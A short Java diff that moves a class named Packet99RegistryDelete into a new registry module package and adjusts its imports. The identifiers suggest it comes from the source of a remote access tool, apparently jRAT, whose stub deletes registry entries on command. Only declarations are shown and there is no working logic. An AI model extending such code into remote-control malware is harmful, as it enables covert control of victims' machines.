@@ -1,6 +1,7 @@
-package io.jrat.stub.packets.incoming;
+package jrat.module.registry;
 
 import io.jrat.stub.Connection;
+import io.jrat.stub.packets.incoming.AbstractIncomingPacket;
 import oslib.OperatingSystem;
 
 public class Packet99RegistryDelete extends AbstractIncomingPacket {
